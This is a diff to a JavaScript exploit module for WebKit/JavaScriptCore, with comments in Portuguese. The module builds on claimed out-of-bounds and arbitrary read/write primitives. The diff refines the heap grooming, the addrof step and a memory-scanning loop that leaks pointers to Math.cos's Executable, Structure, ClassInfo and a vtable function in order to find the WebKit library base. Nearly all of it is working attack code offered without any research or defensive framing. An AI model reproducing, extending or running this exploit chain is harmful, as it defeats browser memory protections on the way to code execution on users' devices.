@@ -1,16 +1,16 @@
-// js/script3/testArrayBufferVictimCrash.mjs (v108 - R85 - Robust Scan & Targeted Grooming)
+// js/script3/testArrayBufferVictimCrash.mjs (v108 - R86 - Fixed Scan Loop Condition & Robustness)
 // =======================================================================================
 // ESTRATÉGIA ATUALIZADA:
 // 1. OOB/L/E Funcional: Primitivas estáveis.
 // 2. Poluição de Heap Persistente: 0xdeadbeef_cafebabe ainda bloqueia vazamentos de ponteiros.
-// 3. Heap Grooming Mais Refinado: Ajustado para buscar "sweet spots" com diferentes volumes
-//    e foco em ArrayBuffers de tamanhos específicos, para forçar padrões de alocação.
-// 4. Vazamento por Varredura de Memória (Mais Robusto):
-//    - Validação de tipo `AdvancedInt64` explícita após leitura arbitrária para evitar `RangeError`.
-//    - Lógica aprimorada para buscar ponteiros válidos e padrões numéricos controlados.
+// 3. Heap Grooming Refinado: Ajustado para buscar "sweet spots".
+// 4. Vazamento por Varredura de Memória (Loop Corrigido e Mais Robusto):
+//    - CORRIGIDO: Condição do loop de varredura para usar comparações numéricas diretas
+//      dos componentes high/low, evitando `TypeError` em `AdvancedInt64.high().greaterThanOrEqual`.
+//    - Validação de tipo `AdvancedInt64` explícita após leitura arbitrária.
 //
-// DIAGNÓSTICO: A poluição é o obstáculo central. Esta versão prioriza uma varredura
-//              mais inteligente e resiliente a erros para encontrar um vazamento.
+// DIAGNÓSTICO: A poluição é o obstáculo central. Esta versão foca em uma varredura
+//              funcional para obter mais informações sobre a distribuição da poluição.
 //
 // ATENÇÃO: A PRIMITIVA DE L/E É SUCESSO. A FALHA NO VAZAMENTO É DEVIDO AO HEAP LAYOUT/GC.
 // =======================================================================================
@@ -24,7 +24,7 @@ import {
 } from '../core_exploit.mjs';
 import { JSC_OFFSETS, WEBKIT_LIBRARY_INFO } from '../config.mjs';
 
-export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "Uncaged_StableRW_v108_R85_RobustScan";
+export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "Uncaged_StableRW_v108_R86_FixedScanLoop";
 
 // --- Funções de Conversão (Double <-> Int64) ---
 function int64ToDouble(int64) {
@@ -382,7 +382,7 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
             logS3(`  Endereço da função Math.cos: ${func_addr.toString(true)}`, "info");
 
             if (!isAdvancedInt64Object(func_addr) || func_addr.equals(NEW_POLLUTION_VALUE) || func_addr.equals(AdvancedInt64.Zero) || func_addr.equals(AdvancedInt64.NaNValue)) {
-                logS3(`    ALERTA DE POLUIÇÃO: Math.cos Addr está lendo o valor de poluição (${NEW_POLLUTION_VALUE.toString(true)}).`, "warn");
+                logS3(`    ALERTA DE POLUIÇÃO/INVALIDADE: Math.cos Addr está lendo o valor de poluição ou inválido (${NEW_POLLUTION_VALUE.toString(true)}).`, "warn");
                 throw new Error("JSCFunction Addr poluído.");
             }
 
@@ -395,7 +395,11 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
                     logS3(`    ALERTA DE POLUIÇÃO: Executable* de Math.cos está lendo o valor de poluição (${NEW_POLLUTION_VALUE.toString(true)}).`, "warn");
                     throw new Error("JSCFunction Executable* poluído.");
                  }
-                 if (!isAdvancedInt64Object(executable_addr) || !executable_addr.equals(AdvancedInt64.Zero) && !executable_addr.equals(AdvancedInt64.NaNValue)) {
+                 if (!isAdvancedInt64Object(executable_addr) || executable_addr.equals(AdvancedInt64.Zero) || executable_addr.equals(AdvancedInt64.NaNValue)) { // Correção aqui: verificar todos os casos inválidos
+                    logS3(`    ALERTA: Executable* de Math.cos é 0, NaN ou inválido.`, "warn");
+                    throw new Error(`Falha ao vazar Executable* de Math.cos: ${executable_addr.toString(true)} é inválido.`);
+                 }
+                 if (executable_addr.high() > 0x40000000) { // Saneamento para Executable*
                     logS3(`++++++++++++ VAZAMENTO DE JSCFUNCTION (EXECUTABLE*) BEM SUCEDIDO! Isso pode ser usado para o WebKit Base. ++++++++++++`, "vuln");
                     final_result.webkit_leak_details = {
                         success: true,
@@ -405,7 +409,8 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
                     };
                     return final_result;
                  } else {
-                     logS3(`    Falha ao vazar Executable* de Math.cos: ${executable_addr.toString(true)} é inválido.`, "warn");
+                    logS3(`    ALERTA: Executable* (${executable_addr.toString(true)}) parece um endereço baixo (Smi?), o que é incomum para um ponteiro de função.`, "warn");
+                    throw new Error("Executable* de Math.cos não parece endereço sane.");
                  }
             } else {
                 logS3(`    Offset para EXECUTABLE_OFFSET em JSFunction não definido em JSC_OFFSETS. Pulando tentativa de vazamento.`, "warn");
@@ -437,23 +442,26 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
             const JSC_CELL_STRUCTURE_POINTER_OFFSET = LOCAL_JSC_OFFSETS.JSCell_STRUCTURE_POINTER_OFFSET;
             const structure_ptr_addr = target_obj_addr.add(JSC_CELL_STRUCTURE_POINTER_OFFSET);
             const structure_addr = arb_read_final(structure_ptr_addr);
-            if (structure_addr.equals(NEW_POLLUTION_VALUE) || structure_addr.equals(AdvancedInt64.Zero) || structure_addr.equals(AdvancedInt64.NaNValue)) {
-                throw new Error("Structure* poluído/inválido para ClassInfo leak.");
+            if (!isAdvancedInt64Object(structure_addr) || structure_addr.equals(NEW_POLLUTION_VALUE) || structure_addr.equals(AdvancedInt64.Zero) || structure_addr.equals(AdvancedInt64.NaNValue)) {
+                logS3(`    ALERTA DE POLUIÇÃO/INVALIDADE: Structure* está lendo o valor de poluição ou inválido (${pollution_value.toString(true)}).`, "warn");
+                throw new Error("Structure* poluído/inválido.");
             }
             logS3(`    Lido Structure* do objeto alvo: ${structure_addr.toString(true)}`, "leak");
 
             const STRUCTURE_CLASS_INFO_OFFSET = LOCAL_JSC_OFFSETS.Structure_CLASS_INFO_OFFSET;
             const class_info_ptr_addr = structure_addr.add(STRUCTURE_CLASS_INFO_OFFSET);
             const class_info_addr = arb_read_final(class_info_ptr_addr);
-            if (class_info_addr.equals(NEW_POLLUTION_VALUE) || class_info_addr.equals(AdvancedInt64.Zero) || class_info_addr.equals(AdvancedInt64.NaNValue)) {
-                throw new Error("ClassInfo* poluído/inválido para ClassInfo leak.");
+            if (!isAdvancedInt64Object(class_info_addr) || class_info_addr.equals(NEW_POLLUTION_VALUE) || class_info_addr.equals(AdvancedInt64.Zero) || class_info_addr.equals(AdvancedInt64.NaNValue)) {
+                logS3(`    ALERTA DE POLUIÇÃO/INVALIDADE: ClassInfo* está lendo o valor de poluição (${pollution_value.toString(true)}).`, "warn");
+                throw new Error("ClassInfo* poluído.");
             }
             logS3(`    Lido ClassInfo* da Structure: ${class_info_addr.toString(true)}`, "leak");
 
             const M_CACHED_TYPE_INFO_OFFSET = LOCAL_JSC_OFFSETS.ClassInfo_M_CACHED_TYPE_INFO_OFFSET;
             const cached_type_info_ptr_addr = class_info_addr.add(M_CACHED_TYPE_INFO_OFFSET);
             const cached_type_info_addr = arb_read_final(cached_type_info_ptr_addr);
-            if (cached_type_info_addr.equals(NEW_POLLUTION_VALUE) || cached_type_info_addr.equals(AdvancedInt64.Zero) || cached_type_info_addr.equals(AdvancedInt64.NaNValue)) {
+            if (!isAdvancedInt64Object(cached_type_info_addr) || cached_type_info_addr.equals(NEW_POLLUTION_VALUE) || cached_type_info_addr.equals(AdvancedInt64.Zero) || cached_type_info_addr.equals(AdvancedInt64.NaNValue)) {
+                logS3(`    ALERTA DE POLUIÇÃO/INVALIDADE: m_cachedTypeInfo está lendo o valor de poluição (${pollution_value.toString(true)}).`, "warn");
                 throw new Error("m_cachedTypeInfo poluído/inválido.");
             }
             logS3(`    Lido m_cachedTypeInfo do ClassInfo: ${cached_type_info_addr.toString(true)}`, "leak");
@@ -486,8 +494,8 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
             const pattern_obj_original_props = {
                 id_val: int64ToDouble(pattern_id),
                 prop_A: int64ToDouble(test_value_pattern),
-                prop_B_u32: 0xDEADBEEF, // Valor que pode ser o "poison" em low 32 bits
-                prop_C_u32: 0xCAFEBABE, // Valor que pode ser o "poison" em low 32 bits
+                prop_B_u32: 0xDEADBEEF,
+                prop_C_u32: 0xCAFEBABE,
                 prop_D_u64: int64ToDouble(new AdvancedInt64(0x98765432, 0x10203040))
             };
             const pattern_obj = Object.assign({}, pattern_obj_original_props);
@@ -499,16 +507,18 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
             const END_SCAN_ADDR = pattern_obj_addr.add(SCAN_RANGE_BYTES);
 
             logS3(`  Varrendo memória de ${START_SCAN_ADDR.toString(true)} a ${END_SCAN_ADDR.toString(true)} (range ${SCAN_RANGE_BYTES * 2} bytes)...`, "info");
-            for (let current_scan_addr = START_SCAN_ADDR; current_scan_addr.high().greaterThanOrEqual(END_SCAN_ADDR.high()) ? false : (current_scan_addr.high().equals(END_SCAN_ADDR.high()) ? (current_scan_addr.low() < END_SCAN_ADDR.low()) : true); current_scan_addr = current_scan_addr.add(8)) {
+            // CORREÇÃO: Condição do loop para usar comparações numéricas diretas
+            for (let current_scan_addr = START_SCAN_ADDR; 
+                 current_scan_addr.high() < END_SCAN_ADDR.high() || (current_scan_addr.high() === END_SCAN_ADDR.high() && current_scan_addr.low() < END_SCAN_ADDR.low()); 
+                 current_scan_addr = current_scan_addr.add(8)) {
+                
                 // Heurística para evitar ler muito longe ou em regiões não mapeadas que causam crash
-                // Reverte a lógica de interrupção se o high do endereço de varredura exceder um limite alto.
-                // Esta é uma heurística para evitar crash ao ler de endereços não mapeados.
-                if (current_scan_addr.high() > 0x7FFFFFFF && current_scan_addr.high() !== NEW_POLLUTION_VALUE.high()) {
+                // Se o endereço de varredura exceder um limite alto, pare.
+                if (current_scan_addr.high() > 0x7FFFFFFF && current_scan_addr.high() !== NEW_POLLUTION_VALUE.high()) { 
                      logS3(`    Parando varredura em endereço alto inesperado (potential crash): ${current_scan_addr.toString(true)}`, "debug");
-                     break;
+                     break; 
                 }
                 
-                // Evitar reler o próprio objeto de padrão diretamente, mas suas propriedades sim
                 if (current_scan_addr.equals(pattern_obj_addr)) {
                     logS3(`    Pulando endereço do próprio objeto de padrão (metadados): ${current_scan_addr.toString(true)}`, "debug");
                     continue;
@@ -522,7 +532,6 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
                     continue;
                 }
                 
-                // CRÍTICO: Valida se o que foi lido é um AdvancedInt64 válido antes de usá-lo.
                 if (!isAdvancedInt64Object(read_val)) {
                     logS3(`    AVISO: Valor lido de ${current_scan_addr.toString(true)} não é AdvancedInt64 válido. Pulando.`, "warn");
                     continue;
@@ -531,10 +540,10 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
                 // 1. Verifique se o valor lido é um dos seus padrões
                 if (read_val.equals(test_value_pattern) || read_val.equals(pattern_id) || read_val.low() === pattern_obj_original_props.prop_B_u32 || read_val.low() === pattern_obj_original_props.prop_C_u32) {
                     logS3(`    Padrão numérico/U32 conhecido '${read_val.toString(true)}' encontrado em ${current_scan_addr.toString(true)}. Controle de escrita/leitura confirmado neste local!`, "info");
-                    // Tente ler offsets próximos para ver se há ponteiros reais
+                    
                     const POTENTIAL_STRUCTURE_PTR_OFFSET_RELATIVE_TO_PATTERN = LOCAL_JSC_OFFSETS.JSCell_STRUCTURE_POINTER_OFFSET - LOCAL_JSC_OFFSETS.JSObject_BUTTERFLY_OFFSET;
                     const potential_structure_ptr_addr = pattern_obj_addr.add(POTENTIAL_STRUCTURE_PTR_OFFSET_RELATIVE_TO_PATTERN);
-                    let potential_structure_val = AdvancedInt64.Zero; // Initialize
+                    let potential_structure_val = AdvancedInt64.Zero;
                     try {
                         potential_structure_val = arb_read_final(potential_structure_ptr_addr);
                     } catch(e) { /* ignore read error for this specific adjacent read */ }
@@ -543,13 +552,12 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
                     if (isAdvancedInt64Object(potential_structure_val) && !potential_structure_val.equals(NEW_POLLUTION_VALUE) && !potential_structure_val.equals(AdvancedInt64.Zero) && !potential_structure_val.equals(AdvancedInt64.NaNValue) && potential_structure_val.high() > 0x40000000 && (potential_structure_val.low() & 0xFFF) === 0) {
                          logS3(`    SUCESSO: Vazamento de ponteiro REAL (não poluído) encontrado adjacente ao padrão: ${potential_structure_val.toString(true)} @ ${potential_structure_ptr_addr.toString(true)}`, "vuln");
                          
-                         // Se encontrou um ponteiro de Structure válido, use-o para o cálculo da base
                          let class_info_from_potential = AdvancedInt64.Zero;
                          try { class_info_from_potential = arb_read_final(potential_structure_val.add(LOCAL_JSC_OFFSETS.Structure_CLASS_INFO_OFFSET)); } catch(e) { /* ignore */ }
                          
                          if (isAdvancedInt64Object(class_info_from_potential) && !class_info_from_potential.equals(NEW_POLLUTION_VALUE) && !class_info_from_potential.equals(AdvancedInt64.Zero) && !class_info_from_potential.equals(AdvancedInt64.NaNValue) && class_info_from_potential.high() > 0x40000000) {
                               let virtual_put_from_class_info = AdvancedInt64.Zero;
-                              try { virtual_put_from_class_info = arb_read_final(class_info_from_potential.add(LOCAL_JSC_OFFSETS.Structure_VIRTUAL_PUT_OFFSET)); } catch(e) { /* ignore */ } // Chute: pode ser Structure->vtable offset para put
+                              try { virtual_put_from_class_info = arb_read_final(class_info_from_potential.add(LOCAL_JSC_OFFSETS.Structure_VIRTUAL_PUT_OFFSET)); } catch(e) { /* ignore */ }
                               
                               if (isAdvancedInt64Object(virtual_put_from_class_info) && !virtual_put_from_class_info.equals(NEW_POLLUTION_VALUE) && !virtual_put_from_class_info.equals(AdvancedInt64.Zero) && !virtual_put_from_class_info.equals(AdvancedInt64.NaNValue) && virtual_put_from_class_info.high() > 0x40000000) {
                                    const expected_put_offset_str = WEBKIT_LIBRARY_INFO.FUNCTION_OFFSETS["JSC::JSObject::put"];
